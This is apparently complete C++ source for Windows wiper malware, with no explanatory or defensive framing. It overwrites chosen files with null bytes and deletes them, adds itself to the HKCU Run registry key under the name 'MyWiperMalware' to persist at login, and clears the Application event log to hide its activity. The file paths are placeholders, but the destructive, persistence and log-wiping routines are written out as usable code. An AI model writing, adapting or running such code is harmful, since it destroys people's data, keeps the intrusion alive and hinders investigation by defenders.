#include <iostream>
#include <fstream>
#include <filesystem>
#include <windows.h>
#include <thread>

// Function to overwrite a file with null bytes
void overwriteFile(const std::string& filepath) {
    try {
        std::ofstream file(filepath, std::ios::binary | std::ios::in);
        if (file.is_open()) {
            auto fileSize = std::filesystem::file_size(filepath);

            for (uint64_t i = 0; i < fileSize; i++) {
                file.put(0);  // Overwriting with null bytes
            }
            file.close();
        }
        std::filesystem::remove(filepath);  // Delete the file after overwriting
        std::cout << "File " << filepath << " overwritten and deleted successfully.\n";
    } catch (const std::exception& e) {
        std::cerr << "Error while overwriting file: " << e.what() << "\n";
    }
}

// Function to add the malware to startup (persistence)
void addRegistryKey(const std::string& exePath) {
    HKEY hKey;
    LONG regOpen = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

    if (regOpen == ERROR_SUCCESS) {
        LONG regSet = RegSetValueEx(hKey, "MyWiperMalware", 0, REG_SZ, (BYTE*)exePath.c_str(), exePath.length() + 1);
        if (regSet == ERROR_SUCCESS) {
            std::cout << "Persistence added successfully.\n";
        }
        RegCloseKey(hKey);
    } else {
        std::cerr << "Failed to open registry key for persistence.\n";
    }
}

// Function to clear Windows event logs
void clearEventLogs() {
    HANDLE hEventLog = OpenEventLog(NULL, "Application");
    if (hEventLog) {
        BOOL result = ClearEventLog(hEventLog, NULL);
        if (result) {
            std::cout << "Application event log cleared.\n";
        } else {
            std::cerr << "Failed to clear Application event log.\n";
        }
        CloseEventLog(hEventLog);
    } else {
        std::cerr << "Failed to open Application event log.\n";
    }
}

// Function to automate the wiper process
void runWiper() {
    // Specify the target files for overwriting and deletion
    std::vector<std::string> filesToWipe = {
        "C:\\path\\to\\file1.txt",
        "C:\\path\\to\\file2.txt",
        // Add more file paths as necessary
    };

    for (const auto& file : filesToWipe) {
        overwriteFile(file);
    }
}

// Function to automate the persistence process
void runPersistence() {
    // Specify the path of the malware executable
    std::string exePath = "C:\\path\\to\\malware.exe";
    addRegistryKey(exePath);
}

// Function to automate the log clearing process
void runCleanup() {
    clearEventLogs();
}

// Main function to coordinate the tasks in correct sequence
int main() {
    try {
        // Step 1: Run the wiper in a separate thread
        std::thread wiperThread(runWiper);
        
        // Step 2: Run the persistence (register malware for startup)
        std::thread persistenceThread(runPersistence);
        
        // Step 3: Run cleanup (clear logs)
        std::thread cleanupThread(runCleanup);

        // Ensure all threads complete before exiting
        wiperThread.join();
        persistenceThread.join();
        cleanupThread.join();

        std::cout << "All tasks executed successfully in sequence.\n";
    } catch (const std::exception& e) {
        std::cerr << "Error in executing malware tasks: " << e.what() << "\n";
    }

    return 0;
}
